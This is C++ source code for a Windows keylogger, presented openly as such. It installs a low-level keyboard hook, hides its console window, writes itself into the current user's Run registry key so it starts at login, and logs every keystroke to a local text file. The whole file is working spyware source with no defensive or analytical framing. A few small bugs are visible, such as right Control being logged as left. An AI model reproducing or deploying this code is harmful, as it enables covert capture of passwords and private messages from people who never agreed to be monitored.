#define PATH "KeyLogger_OUTFILE.txt" // path to keylogger OUTPUT file location
#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
void hide();
void show();
bool saveToFile(DWORD key);
bool addToStartup(); // starts keylogger at startup by adding it to the registry
std::wstring findexePth();
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam); // keyboard hook production
HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);

int main()
{
	hide();
	addToStartup();
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}

bool saveToFile(DWORD key)
{
	FILE* OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
		return false;
	else if (key == VK_ESCAPE)
	{
		UnhookWindowsHookEx(keyboardHook);
		fprintf(OUTPUT_FILE, "%s", "\nEXIT PRESSED\n");
		fclose(OUTPUT_FILE);
		exit(1);
	}

	else if (key == VK_TAB) // ### SHIFT KEYS
		fprintf(OUTPUT_FILE, "%s", " [TAB]");
	else if (key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " [SPACE]");
	else if (key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", " [ENTER]");
	else if (key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", " [BACKSPACE]");
	else if (key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", " [DELETE]");
	else if (key == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", " [ALT]");
	else if (key == VK_LCONTROL)
		fprintf(OUTPUT_FILE, "%s", " [LEFT CONTROL]");
	else if (key == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", " [LEFT CONTROL]");
	else if (key == VK_LSHIFT)
		fprintf(OUTPUT_FILE, "%s", " [LEFT SHIFT]");
	else if (key == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", " [RIGHT SHIFT]");
	else if (key == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", " [CAPS LOCK]");
	else if (key == VK_NUMPAD0) // ### NUMPAD KEYS
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 0]");
	else if (key == VK_NUMPAD1)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 1]");
	else if (key == VK_NUMPAD2)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 2]");
	else if (key == VK_NUMPAD3)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 3]");
	else if (key == VK_NUMPAD4)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 4]");
	else if (key == VK_NUMPAD5)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 5]");
	else if (key == VK_NUMPAD6)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 6]");
	else if (key == VK_NUMPAD7)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 7]");
	else if (key == VK_NUMPAD8)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 8]");
	else if (key == VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 9]");
	else if (key == VK_F1) //  ### FUNCTION KEYS
		fprintf(OUTPUT_FILE, "%s", " [F1]");
	else if (key == VK_F2)
		fprintf(OUTPUT_FILE, "%s", " [F2]");
	else if (key == VK_F3)
		fprintf(OUTPUT_FILE, "%s", " [F3]");
	else if (key == VK_F4)
		fprintf(OUTPUT_FILE, "%s", " [F4]");
	else if (key == VK_F5)
		fprintf(OUTPUT_FILE, "%s", " [F5]");
	else if (key == VK_F6)
		fprintf(OUTPUT_FILE, "%s", " [F6]");
	else if (key == VK_F7)
		fprintf(OUTPUT_FILE, "%s", " [F7]");
	else if (key == VK_F8)
		fprintf(OUTPUT_FILE, "%s", " [F8]");
	else if (key == VK_F9)
		fprintf(OUTPUT_FILE, "%s", " [F9]");
	else if (key == VK_F10)
		fprintf(OUTPUT_FILE, "%s", " [F10]");
	else if (key == VK_F11)
		fprintf(OUTPUT_FILE, "%s", " [F11]");
	else if (key == VK_F12)
		fprintf(OUTPUT_FILE, "%s", " [F12]");
	else
	{
		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) // to check if the key is an uppercase letter
			key = tolower(key);
		fprintf(OUTPUT_FILE, "%s", &key);
	}
	fclose(OUTPUT_FILE);
	return true;
}

bool addToStartup()
{
	std::wstring progPath = findexePth(); // function to find the path to keylogger.exe
	if (progPath == L" ")
		return false;
	HKEY hkey = NULL; // registry variable
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	if (createStatus != ERROR_SUCCESS) // RegCreateKey returns 0L or ERROR_SUCCESS if succeeded
		return false;
	RegSetValueEx(hkey, L"KeyLogger", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t)); // sets the registry value to the keylogger.exe path
	RegCloseKey(hkey);
	return true;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// PKBDLLHOOKSTRUCT or KBDLLHOOKSTRUCT - structure that contains low-level keyboard input
	// wParam - key type
	// lParam - type of PKBDLLHOOKSTRUCT
	// nCode - represented as 0 or HC_ACTION if a key was pressed, otherwise any number below 0
	PKBDLLHOOKSTRUCT kbs = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
		saveToFile(kbs->vkCode);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
static void hide()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

static void show()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}

std::wstring findexePth()
{
	WCHAR ourPth[MAX_PATH];
	// When NULL is passed to GetModuleHandle, the handle of the exe itself is returned
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule != NULL)
	{
		// Use GetModuleFileName() with module handle to get the path
		GetModuleFileName(hModule, ourPth, (sizeof(ourPth)));
		std::wstring fullPth(ourPth); // converting the path to wstring 
		return fullPth;
	}
	return L" ";
}